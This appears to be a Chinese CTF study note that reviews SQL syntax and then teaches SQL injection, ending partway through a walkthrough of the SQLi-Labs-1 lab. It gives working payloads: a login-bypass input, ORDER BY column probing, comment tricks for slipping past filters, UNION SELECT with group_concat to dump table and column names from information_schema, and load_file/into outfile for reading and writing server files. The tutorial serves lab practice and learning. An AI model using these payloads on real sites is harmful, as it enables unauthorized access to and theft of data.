+<h3 id="数据的处理-查询-修改-插入-和删除"><a href="#数据的处理-查询-修改-插入-和删除" class="headerlink" title="数据的处理(查询 修改(插入)和删除)"></a>数据的处理(查询 修改(插入)和删除)</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECT：用于从数据库中查询数据。</p>
+<p>SELECT column_name(s)</p>
+<p>FROM table_name</p>
+<p>WHERE condition</p>
+<p>ORDER BY column_name [ASC|DESC]</p>
+<ul>
+<li><code>column_name(s)</code>: 要查询的列。</li>
+<li><code>table_name</code>: 要查询的表。</li>
+<li><code>condition</code>: 查询条件（可选）。</li>
+<li><code>ORDER BY</code>: 排序方式，<code>ASC</code> 表示升序，<code>DESC</code> 表示降序（可选）。</li>
+</ul>
+<p><strong>注意 没有分号,这四行是一条完整的 SELECT 语句,换行只为了可读性</strong></p>
+<h4 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h4><p>INSERT INTO：用于向数据库表中插入新数据。</p>
+<p>INSERT INTO table_name (column1, column2, …)</p>
+<p>VALUES (value1, value2, …)</p>
+<ul>
+<li><code>table_name</code>: 要插入数据的表。</li>
+<li><code>column1, column2, ...</code>: 要插入数据的列。</li>
+<li><code>value1, value2, ...</code>: 对应列的值。</li>
+</ul>
+<h4 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h4><p>UPDATE：用于更新数据库表中的现有数据。</p>
+<p>UPDATE table_name</p>
+<p>SET column1 &#x3D; value1, column2 &#x3D; value2, …</p>
+<p>WHERE condition</p>
+<ul>
+<li><code>table_name</code>: 要更新数据的表。</li>
+<li><code>column1 = value1, column2 = value2, ...</code>: 要更新的列及其新值。</li>
+<li><code>condition</code>: 更新条件。</li>
+</ul>
+<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：用于从数据库表中删除数据。</p>
+<p>DELETE FROM table_name</p>
+<p>WHERE condition</p>
+<ul>
+<li><code>table_name</code>: 要删除数据的表。</li>
+<li><code>condition</code>: 删除条件。</li>
+</ul>
+<h3 id="数据库表的处理-创建-修改和删除"><a href="#数据库表的处理-创建-修改和删除" class="headerlink" title="数据库表的处理(创建 修改和删除)"></a>数据库表的处理(创建 修改和删除)</h3><h4 id="CREATE-TABLE"><a href="#CREATE-TABLE" class="headerlink" title="CREATE TABLE"></a>CREATE TABLE</h4><p>CREATE TABLE：用于创建新的数据库表。</p>
+<p>CREATE TABLE table_name (</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">column1 data_type constraint,</span><br><span class="line"></span><br><span class="line">column2 data_type constraint,</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>)</p>
+<ul>
+<li><code>table_name</code>: 要创建的表名。</li>
+<li><code>column1, column2, ...</code>: 表的列。</li>
+<li><code>data_type</code>: 列的数据类型（如 <code>INT</code>、<code>VARCHAR</code> 等）。</li>
+<li><code>constraint</code>: 列的约束（如 <code>PRIMARY KEY</code>、<code>NOT NULL</code> 等）。</li>
+</ul>
+<h4 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h4><p>ALTER TABLE：用于修改(添加或者删除列)现有数据库表的结构。</p>
+<p>ALTER TABLE table_name</p>
+<p>ADD column_name data_type</p>
+<ul>
+<li><code>table_name</code>: 要修改的表。</li>
+<li><code>column_name</code>: 要添加的列。</li>
+<li><code>data_type</code>: 列的数据类型。</li>
+</ul>
+<p>或：</p>
+<p>ALTER TABLE table_name</p>
+<p>DROP COLUMN column_name</p>
+<ul>
+<li><code>column_name</code>: 要删除的列。</li>
+</ul>
+<h4 id="DROP-TABLE"><a href="#DROP-TABLE" class="headerlink" title="DROP TABLE"></a>DROP TABLE</h4><p>DROP TABLE：用于删除数据库表。</p>
+<p>DROP TABLE table_name</p>
+<ul>
+<li><code>table_name</code>: 要删除的表。</li>
+</ul>
+<h3 id="索引的操作"><a href="#索引的操作" class="headerlink" title="索引的操作"></a>索引的操作</h3><h4 id="CREATE-INDEX"><a href="#CREATE-INDEX" class="headerlink" title="CREATE INDEX"></a>CREATE INDEX</h4><p>CREATE INDEX：用于创建索引，以加快查询速度。</p>
+<p>CREATE INDEX index_name</p>
+<p>ON table_name (column_name)</p>
+<ul>
+<li><code>index_name</code>: 索引的名称。</li>
+<li><code>column_name</code>: 要索引的列。</li>
+</ul>
+<h4 id="DROP-INDEX"><a href="#DROP-INDEX" class="headerlink" title="DROP INDEX"></a>DROP INDEX</h4><p>DROP INDEX：用于删除索引。</p>
+<p>DROP INDEX index_name</p>
+<p>ON table_name</p>
+<ul>
+<li><code>index_name</code>: 要删除的索引名称。</li>
+<li><code>table_name</code>: 索引所在的表。</li>
+</ul>
+<h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHERE：用于指定筛选条件。</p>
+<p>SELECT column_name(s)</p>
+<p>FROM table_name</p>
+<p>WHERE condition</p>
+<ul>
+<li><code>condition</code>: 筛选条件。</li>
+</ul>
+<p>例如 列名 &#x3D; … 等</p>
+<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>ORDER BY：用于对结果集进行排序。</p>
+<p>SELECT column_name(s)</p>
+<p>FROM table_name</p>
+<p>ORDER BY column_name [ASC|DESC]</p>
+<ul>
+<li><code>column_name</code>: 用于排序的列。</li>
+<li><code>ASC</code>: 升序（默认）。</li>
+<li><code>DESC</code>: 降序。</li>
+</ul>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br></pre></td></tr></table></figure>
+
+<p>其中，column1、column2 等表示要查询的列名，table_name 表示要查询的表名，condition  表示查询条件，column_name 表示要按照哪一列进行排序，ASC 或 DESC  表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</p>
+<p>注意:<strong>在 SQL 注入中我们常用它来判断列数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
+
+<h4 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h4><p>GROUP BY：用于将结果集按一列或多列进行分组。</p>
+<p>SELECT column_name(s), aggregate_function(column_name)</p>
+<p>FROM table_name</p>
+<p>WHERE condition</p>
+<p>GROUP BY column_name(s)</p>
+<ul>
+<li><code>aggregate_function</code>: 聚合函数（如 COUNT、SUM、AVG 等）。</li>
+</ul>
+<h4 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h4><p>HAVING：用于对分组后的结果集进行筛选。</p>
+<p>SELECT column_name(s), aggregate_function(column_name)</p>
+<p>FROM table_name</p>
+<p>GROUP BY column_name(s)</p>
+<p>HAVING condition</p>
+<ul>
+<li><code>condition</code>: 筛选条件。</li>
+</ul>
+<h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN：用于将两个或多个表的记录结合起来。</p>
+<p>SELECT column_name(s)</p>
+<p>FROM table_name1</p>
+<p>JOIN table_name2</p>
+<p>ON table_name1.column_name &#x3D; table_name2.column_name</p>
+<ul>
+<li><code>JOIN</code>: 可以是 INNER JOIN、LEFT JOIN、RIGHT JOIN 或 FULL JOIN。</li>
+</ul>
+<h4 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h4><p>DISTINCT：用于返回唯一不同的值。</p>
+<p>SELECT DISTINCT column_name(s)</p>
+<p>FROM table_name</p>
+<ul>
+<li><code>column_name(s)</code>: 要查询的列。</li>
+</ul>
+<h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="*LIMIT"></a>*LIMIT</h4><p><code>LIMIT</code> 限制返回的记录数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#返回表中前number行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT number;</span><br><span class="line">#从offset+1行开始返回row_count行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT offset, row_count;</span><br><span class="line">#比如 LIMIT 10, 10 返回11-20行数据</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</span><br></pre></td></tr></table></figure>
+
+<h4 id="UNION"><a href="#UNION" class="headerlink" title="*UNION"></a>*UNION</h4><ul>
+<li><code>UNION</code> 用于合并两个或多个 SELECT 语句的结果集</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名 FROM 表名UNIONSELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
+
+<p>注意：使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
+<h3 id="注释"><a href="#注释" class="headerlink" title="*注释"></a>*注释</h3><ul>
+<li><code>注释</code></li>
+</ul>
+<p><code>--</code> 这是一个单行注释。注意，<code>--</code> 后必须加一个空格或者加号，注释才会生效，所以一般用–+ + 表示空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br></pre></td></tr></table></figure>
+
+<p><code>#</code> 是另一种单行注释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br></pre></td></tr></table></figure>
+
+<p>多行注释使用 <code>/*</code> 和 <code>*/</code> 包裹注释内容，可以跨多行书写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格/*中间的内容都将被注释*/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在，在其他数据库中会被忽略</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="*常用参数"></a>*常用参数</h3><p>常用参数：</p>
+<ul>
+<li><code>user()</code>：当前数据库用户</li>
+<li><code>database()</code>：当前数据库名</li>
+<li><code>version()</code>：当前使用的数据库版本</li>
+<li><code>@@datadir</code>：数据库存储数据路径</li>
+<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
+<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
+<li><code>concat_ws()</code>：用法类似</li>
+<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
+<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
+</ul>
+<h1 id="Week4-2-SQL-注入"><a href="#Week4-2-SQL-注入" class="headerlink" title="[Week4.2]SQL 注入"></a>[Week4.2]SQL 注入</h1><h2 id="概论-1"><a href="#概论-1" class="headerlink" title="概论"></a>概论</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>SQL 注入</strong>是 CTF web 中最常见的漏洞之一，是攻击者通过输入特殊构造的字符串，篡改后端 SQL 查询语句，从而实现未授权操作的漏洞。</p>
+<h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><ol>
+<li>程序未对用户输入做严格过滤，直接将输入拼接到 SQL 语句中。</li>
+<li>攻击者利用引号、注释符等 SQL 语法，改变原查询的逻辑（比如绕开登录验证、查询敏感数据）。</li>
+<li>后端数据库执行了被篡改的恶意 SQL 语句，返回攻击者需要的结果。</li>
+</ol>
+<h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设登录功能的后端 SQL 语句是：<code>select * from user where username=&#39;用户输入&#39; and password=&#39;用户输入&#39;</code></p>
+<ul>
+<li>正常输入：用户名 <code>admin</code>、密码 <code>123</code>，SQL 语句正常执行，验证账号密码。</li>
+<li>注入输入：用户名 <strong>admin’ –</strong>、密码任意，拼接后 SQL 变成 <code>select * from user where username=&#39;admin&#39; --&#39; and password=&#39;任意&#39;</code>。</li>
+<li>其中 <code>&#39;</code> 闭合前面的引号，<code>--</code> 是 SQL 注释符，后面的内容被忽略，最终直接查询 <code>username=&#39;admin&#39;</code> 的用户，绕开密码验证。</li>
+</ul>
+<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
+<li>读取数据库敏感数据（比如用户账号密码、flag）。</li>
+<li>篡改数据库内容（修改密码、插入恶意数据）。</li>
+<li>甚至通过高阶注入获取服务器权限。</li>
+</ul>
+<h3 id="SELECT-函数预备知识"><a href="#SELECT-函数预备知识" class="headerlink" title="SELECT 函数预备知识"></a>SELECT 函数预备知识</h3><p>SELECT 既可以查询列的内容,还可以查询函数的返回值,也可以直接查询并返回字符串.</p>
+<p><code>因为 SELECT</code> 核心能力就是 “查询并返回数据”，而数据的来源可以是 <strong>表的列、函数返回值、直接写的常量（字符串、数字等）</strong></p>
+<h2 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h2><p>按照查询字段分类，可以分为字符型(当输入的参数为字符串时，称为字符型注入)和数字型(当输入的参数为整形时，称为数字型注入)</p>
+<p>按照注入方法，又可以分为 Union 注入，报错注入，布尔注入，时间注入等</p>
+<p><strong>注入点</strong>：可以实行注入的地方，通常是一个访问数据库的连接。例如用 post&#x2F;get 提交一个变量的值</p>
+<p><strong>实战中我们要推断 get 变量前面的数据库指令，以达成目标</strong></p>
+<p><strong>对于基础的 SQL 注入，大致分为找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
+<p><strong>输出同列数的数据库表，找到回显位并获取信息(具体可看文后的解题步骤).</strong></p>
+<p>注:有的时候页面只能显示一个内容，第二句的内容是不显示的，</p>
+<p>可以把第一句的内容改为数据库不存在的数据，如 id&#x3D;0。</p>
+<p><img src="/images/Qt85brpF2oeKbdxjo4WcFAW9n4N.png"></p>
+<h3 id="判断数字型-字符型注入"><a href="#判断数字型-字符型注入" class="headerlink" title="判断数字型&#x2F;字符型注入"></a>判断数字型&#x2F;字符型注入</h3><p>数字型和字符型的最本质区别就是变量的值是否被单&#x2F;双引号闭合.</p>
+<h4 id="方法一-使用-and-1-1-and-1-2-进行判断"><a href="#方法一-使用-and-1-1-and-1-2-进行判断" class="headerlink" title="方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断"></a>方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断</h4><p>例如你要 get: ?id&#x3D;1</p>
+<p>为了判断输入的 1 是数字型还是字符型，你可以在 1 后面添加 and 1&#x3D;1 和 and 1&#x3D;2</p>
+<p>添加 and 1&#x3D;1 时，字符型和数字型都可以执行后续的命令</p>
+<p>但是添加 and 1&#x3D;2 时，只有字符型可以执行 get 以后的命令，因为数字型不带引号，将 and 1&#x3D;2 视为本句话内额外的命令，and 1&#x3D;2 返回的是 false，后续的指令将无法执行.</p>
+<h4 id="方法二-使用带减号的运算表达式进行判断"><a href="#方法二-使用带减号的运算表达式进行判断" class="headerlink" title="方法二 使用带减号的运算表达式进行判断"></a><strong>方法二 使用带减号的运算表达式进行判断</strong></h4><p>若为数字型，get：?id&#x3D;2-1 会等价于 id&#x3D;1</p>
+<p>若为字符型则不会执行 id&#x3D;1 的操作.</p>
+<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>运用<strong>构造闭合</strong>的方法，进行注入类型判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ?</span><br></pre></td></tr></table></figure>
+
+<p>这里的问号可以有多种的闭合方式, <code>$id</code>, <code>&#39;$id&#39;</code>, <code>&quot;$id&quot;</code>, <code>($id)</code>,(“”),(‘’)等。</p>
+<p>比如后台为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;$id&quot;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们使传入的 $id &#x3D; ‘1”‘, 那么后台执行则为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;1&quot; &quot;</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们对 1 完成了闭合构造，但是我们闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号则会导致报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>所以我们通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code> <code>--</code></p>
+<p>上面是白盒下面很直观的版本，但是大多数情况下，<strong>SQL 注入都是黑盒</strong>，我们不知道后台到底是怎么写的，<strong>所以我们需要一些判断的方法或者技巧</strong>。</p>
+<h4 id="通过是否报错"><a href="#通过是否报错" class="headerlink" title="通过是否报错"></a><strong>通过是否报错</strong></h4><p>比如，我们使用 <code>1&#39;</code> 进行试探:</p>
+<h4 id="通过报错信息"><a href="#通过报错信息" class="headerlink" title="通过报错信息"></a><strong>通过报错信息</strong></h4><blockquote>
+<p>注：我们省略了部分语句和相同的报错，实战中只要看表中出现的不同报错就行了。<br><code>SELECT username,password FROM users WHERE id = &quot;1&quot;&quot;;</code>  -&gt; id&#x3D;xx<br><code>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near &#39;1&#39;&#39; at line 1</code><br>-&gt; <code>near &#39;1&#39;&#39; at line 1</code></p>
+</blockquote>
+<p>这里 near 后的字符自带单引号，要去除掉,去除后就是后台报错的解释</p>
+<h3 id="寻找回显位-见-SQLi-Labs-1-解题"><a href="#寻找回显位-见-SQLi-Labs-1-解题" class="headerlink" title="寻找回显位(见 SQLi-Labs-1 解题)"></a>寻找回显位(见 SQLi-Labs-1 解题)</h3><p><strong>下面，将按点展开阐述不同注入方法的注入过程</strong></p>
+<h2 id="字符型-UNION-注入"><a href="#字符型-UNION-注入" class="headerlink" title="字符型 UNION 注入"></a>字符型 UNION 注入</h2><p>最终目标:使用 union 注入拿到靶机中数据库里的所有用户名和密码。</p>
+<p><em>注:使用不同的注入方法时，基本的步骤还是保持不变</em></p>
+<p><strong>找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
+<p><strong>输出同列数的数据库表，找到回显位并获取信息</strong></p>
+<h3 id="拿到表名和列名"><a href="#拿到表名和列名" class="headerlink" title="拿到表名和列名"></a>拿到表名和列名</h3><p>想要拿到表名和列名，首先要知道他们存放在哪里</p>
+<p>在 mysql 中，有一个名为 information_schema 的数据库，里面包含所有 mysql 数据库的简要信息</p>
+<p>而其中包含两个存放表名和列名的数据表.</p>
+<p>_tips:<strong>database()</strong>：当前数据库名_</p>
+<p><img src="/images/DGHpbtvLGoDprTxK2gqcF7t4nKb.png"></p>
+<p>表名集合表中，列名为”table_name”的一列存放着所有的<strong>表名</strong>，而列名为”table_schema”的一列存放着这个表所属的<strong>数据库名</strong></p>
+<p><em>注:引用非当前数据库的表名要用 &lt; 数据库名 &gt;.&lt; 表名 &gt; 实现</em></p>
+<p><img src="/images/D2PYbxfExoZ6iQxtGwncImPtnOf.png"></p>
+<p>这行代码，可以利用数据库 information_schema 中的 tables 表名集合表，来获得 security 数据库中的表名.</p>
+<p>若不清楚你需要的数据库名为什么，就使用 table_schema&#x3D;database(),注意不用加引号</p>
+<p><em>注:拿到列名，和拿到表名的流程是一样的，这里不再赘述,把表名改成 column 而非 table 即可</em></p>
+<p><em>而在表 information_schema.colulumn 中，column_name 代表列名，但还是有 table_name 这一列，代表所在的表名，和 table_schema 这一列，代表所在的数据库名</em></p>
+<p><img src="/images/DUZibdAo7oE0vuxv7MycAR58nwb.png"></p>
+<p>用 and 连接两个条件，可以既限制数据库名，又限制表名来获得正确的列名</p>
+<p>这里为什么知道需要的表名为 users 呢?是因为我们通过查询当前数据库下所有的表名逐个推断出来的，可以查询多个表名，看看哪个表中有用户名和密码这两列,再进入下一个步骤</p>
+<h3 id="解决回显位只能显示一个数据的问题"><a href="#解决回显位只能显示一个数据的问题" class="headerlink" title="解决回显位只能显示一个数据的问题"></a>解决回显位只能显示一个数据的问题</h3><p>解决这个问题需要使用 group_concat()函数.</p>
+<p>group_concat(&lt; 列名 &gt;)的返回值仍为本列，但若用 group_concat(&lt; 列名 &gt;)代替 &lt; 列名 &gt; 放入 select 函数，select 就会输出 &lt; 数据 1&gt;,&lt; 数据 2&gt;……为一个数据正如:</p>
+<p><img src="/images/XxuebGLIuoXkYDxmXuccv7kgn57.png"></p>
+<p>而非只输出 emails</p>
+<h3 id="查询最终目标"><a href="#查询最终目标" class="headerlink" title="查询最终目标"></a>查询最终目标</h3><p>知道了需要的表名和列名以后，再用 group_concat()来查询最终的目标，在这里是用户名和密码</p>
+<p>我们输入</p>
+<p><img src="/images/ZearbzMB2oR0h5xgoTGc70ZPncd.png"></p>
+<p>用 group_concat 同时输出两列的内容，中间用分隔符~连接，即可获得所有的用户名和密码</p>
+<p>这里的 users 和 username,password 都是通过查询 information_schema 数据库中的内容获取的</p>
+<p><em>注:这样便说明了 group_concat(多个列名相连接)可以用 SELECT 函数和一列的空间输出两列的内容,</em></p>
+<p><em>而非 ORDER BY 几就输出几列.</em></p>
+<h3 id="SQLi-Labs-1-解题示例"><a href="#SQLi-Labs-1-解题示例" class="headerlink" title="SQLi-Labs-1 解题示例"></a>SQLi-Labs-1 解题示例</h3><p>SQLi-Labs-1 是一道最基础的 union 题，我们再复习一遍解题的流程</p>
+<p><img src="/images/XUyibqmrdojcIOxObOdcylPKn7b.png"></p>
+<h4 id="1-查找注入点"><a href="#1-查找注入点" class="headerlink" title="1.查找注入点"></a>1.查找注入点</h4><p><img src="/images/M9anbtKV3o4s1YxEIV5cG9IBnHe.png"></p>
+<p>注意到本题提示需要你输入 id，又没有输入的窗口，于是尝试 post id&#x3D;1 和 get id&#x3D;1</p>
+<p>发现 get id&#x3D;1 让网页有了回显，这样便发现了这么一个注入点.</p>
+<p><img src="/images/HV1abjyhYoi37ixxUcccLqC5nqn.png"></p>
+<p><img src="/images/APiXbwAe6oohRcxmztmcwbkYn4W.png"><br><img src="/images/AKJKbG3ypos6K4xan3rcm6z0nmG.png"><br>尝试更换几个数字，发现 login name 和 password 一直在变，说明这是一个数据库表的某两列</p>
+<h4 id="2-判断注入类型-字符型-数字型"><a href="#2-判断注入类型-字符型-数字型" class="headerlink" title="2.判断注入类型(字符型&#x2F;数字型)"></a>2.判断注入类型(字符型&#x2F;数字型)</h4><p>这里 get 一个?id&#x3D;3-2,他的回显并不是 id&#x3D;1 的回显,故认为是字符型.</p>
+<p><img src="/images/SzGZbDPi4oj0OIxLjsncp0ovnld.png"></p>
+<h4 id="3-找到闭合方式"><a href="#3-找到闭合方式" class="headerlink" title="3.找到闭合方式"></a>3.找到闭合方式</h4><p><img src="/images/ZLJjb9TtPo5ksAxKjtlcKf1Unkg.png"></p>
+<p>先试了试双引号,发现并没有报错,如果闭合方式是双引号,那他包会报错的,因为你提前闭合了,那就是单引号了,我们可以验证一下: get: ?id&#x3D;’1</p>
+<p><img src="/images/HhQRbKyL8o5HaDxmAE3cC33nnKd.png"></p>
+<p>先排除一下 near 后和 at 前的第一个单引号，这作为报错的引用号，不是代码里的内容</p>
+<p>真正报错的内容是:</p>
+<p>1’LIMIT 0,1</p>
+<p><em>LIMIT 是限制回显的行，这里是返回 0 到 1 行的数据</em></p>
+<p><em>这个我们可以不管，因为在这里真正限制回显的是</em><strong>回显位，而不是 LIMIT</strong></p>
+<p>实际上这原本是:</p>
+<p>**’****’<strong>1</strong>‘**LIMIT 0,1</p>
+<p>黄底的单引号直接空引用视为空了</p>
+<p>而代表闭合方式的单引号是红色的</p>
+<p>如果我们 get 的是 1,那肯定正常运行了,实际的后半段代码是</p>
+<p>‘1’LIMIT 0,1</p>
+<p>或者再试试 1’,发现 1’直接被单引号包裹了</p>
+<p><img src="/images/S2qybJcijoaLfNxBKhLcJ2g1nsg.png"></p>
+<p>也能直接判断闭合方式就是单引号</p>
+<h4 id="4-判断查询列数"><a href="#4-判断查询列数" class="headerlink" title="4.判断查询列数"></a>4.判断查询列数</h4><p>我们这里是 UNION 注入,UNION 前后的 SELECT 要求列数是相同的,先看看前面的 SELECT(要你填 id 的 SELECT)查了几列(查了几列和 LIMIT”要查几行”和回显都没有关系,最终回显的东西是看回显位,这里是为了让 UNION 结构正常运行)</p>
+<p>我们采用 ORDER BY &lt; 列数 &gt; 调试一下,注意末尾加个–+,+ 代表空格注释掉后面可能有的对于原指令的限制条件，以让 ORDER BY 正常执行</p>
+<p><img src="/images/L8meb4D39oBiXMx7bp8cFrLanNc.png"></p>
+<p><img src="/images/ObedbqB8hoqRoqxQZ6lcqCEJnOh.png"></p>
+<p>这里尝试了一下 ORDER BY 1-4，发现恰好在 3 这里可以执行，说明前面的 SELECT,他查询了三列,我们后面的 UNION 也要是三列</p>
+<h4 id="5-找到回显位"><a href="#5-找到回显位" class="headerlink" title="5.找到回显位"></a>5.找到回显位</h4><p>既然 SELECT 他查询了三列,但是 Your Login name 和 Password 他只显示两列的内容，而且只有一个数据(因为列名并没有被 group_concat()包裹)，那不妨看看他会显示 UNION 后的(我们可操控的)哪两列.</p>
+<p><img src="/images/Bk24bH0bZof4iIxQreUc8UnPniA.png"></p>
+<p>直接输列名 1,2,3 不加 FROM,他应该会直接返回数字 1,2,3;</p>
+<p>这里让 id&#x3D;-1,让 UNION 前面的查询无效,避免回显位仍显示 UNION 前正常的内容</p>
+<p>发现回显了 2,3,发现 UNION 后,SELECT 的第二个和第三个列是有用的(会产生回显的)</p>
+<p>随后我们要查询的列，就放在 SELECT 的第二个或第三个位置</p>
+<h4 id="6-查询表名和列名"><a href="#6-查询表名和列名" class="headerlink" title="6.查询表名和列名"></a>6.查询表名和列名</h4><p>下一步按道理是获取全部人的用户名和密码,我们需要找到用户名和密码所在的数据库表和真正的列名，并使用 group_concat()让他们一一回显.</p>
+<p>先查询表名,payload:</p>
+<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
+<p>这里查询的是当前数据库即 database()函数返回的数据库中的所有表名</p>
+<p>其作为一个列存放于数据库 information_schema 中的一个表 tables</p>
+<p><img src="/images/LLlVbjCCXomHFsxlfS7cVjcvnPb.png"></p>
+<p>看到了竟然有一个表叫 flag,那 flag 估计在这个表里，不是在获取所有用户名和密码的时候回显…</p>
+<p>那再查询列名,看看表 flag 里面有哪些列,payload:</p>
+<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(COLUMN_NAME),3 FROM information_schema.columns WHERE table_schema&#x3D;database() and table_name&#x3D;’flag’ –+</p>
+<p>这里查询的是 database()返回的数据中,表’flag’中的全部列名(两个条件用 and 连接,注意 table_name 代表你想查询的列所在的表,加<strong>单引号</strong>表示字符串)</p>
+<p><img src="/images/HR1wbYDQTozhCpxXAOwcVOS7nVd.png"></p>
+<p>回显就两列,id 和 flag,看看这两列呗</p>
+<h4 id="7-得到答案"><a href="#7-得到答案" class="headerlink" title="7.得到答案"></a>7.得到答案</h4><p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(FLAG),3 FROM FLAG–+</p>
+<p><img src="/images/PNxMbXs3JoH5Bbx072sctFC4nDb.png"></p>
+<p>发现表名好像区分大小写(?)</p>
+<p>并且发现了 <strong>FROM 一个不存在的表名,好像就能看到 database()返回的数据库名了</strong></p>
+<p>修改一下准确的大小写</p>
